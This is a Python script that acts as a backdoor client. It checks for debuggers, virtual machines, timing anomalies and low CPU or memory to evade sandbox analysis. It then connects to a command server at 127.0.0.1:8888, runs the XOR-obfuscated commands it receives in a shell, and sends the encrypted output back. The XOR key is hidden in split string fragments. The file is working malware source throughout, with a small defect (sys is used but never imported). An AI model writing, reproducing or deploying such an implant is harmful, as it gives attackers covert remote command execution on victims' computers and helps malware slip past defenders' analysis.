import socket
import subprocess
from ctypes import windll



def is_sandbox():
    try:
        
        
        
        
        if windll.kernel32.IsDebuggerPresent():
            return True
        

        
        

        
        

        
        

        
        
        
        
        
        

        
        
        import wmi
        c = wmi.WMI()
        for item in c.Win32_ComputerSystem():
            manufacturer = item.Manufacturer.lower()
            model = item.Model.lower()
            if ("vmware" in manufacturer or 
                "virtualbox" in model or 
                "xen" in manufacturer or 
                "qemu" in manufacturer):
                return True
        

        
        

        
        

        
        
        
        
        
        

        
        

        
        
        import time
        start_time = time.time_ns() // 1_000_000  
        time.sleep(2)  
        elapsed_time = (time.time_ns() // 1_000_000) - start_time
        if elapsed_time < 1900:  
            return True
        

        
        

        
        
        
        
        
        

        
        

        
        

        
        
        import multiprocessing
        if multiprocessing.cpu_count() < 2:
            return True
        

        
        
        
        
        
        

        
        

        
        

        
        

        
        
        import psutil
        memory_gb = psutil.virtual_memory().total / (1024 ** 3)
        if memory_gb < 4:
            return True
        
        
        
        return False
    except:
        return False



def get_key():
    part1 = "fo"
    part2 = "ob"
    part3 = "arb"
    part4 = "la"
    part5 = "bla"
    part6 = "la"
    fake_key = "thisFAKEKEY"  
    return (part1 + part2 + part3 + part4 + part5 + part6).encode()

key = get_key()


def enc_xor(data, key):
    key_size = len(key)
    return bytes(
        data_byte ^ key[i % key_size]
        for i, data_byte in enumerate(data)
    )


def connect_server(server_host, server_port):
    
    if is_sandbox():
        print("Sandbox detected. Exiting...")
        return
    

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_host, server_port))
    print(f"Connected to server {server_host}:{server_port}")

    while True:
        
        encrypted_command = client.recv(1024)
        decrypted_command = enc_xor(encrypted_command, key).decode().strip()
        print(f"Received command: {decrypted_command}")

        
        try:
            output = subprocess.Popen(decrypted_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = output.communicate()
            result = stdout if stdout else stderr
        except Exception as e:
            result = str(e).encode()

        
        encrypted_result = enc_xor(result, key)
        client.send(encrypted_result)

    client.close()

if __name__ == "__main__":
	
    if is_sandbox():  
        sys.exit(0)  
    
    connect_server("127.0.0.1", 8888)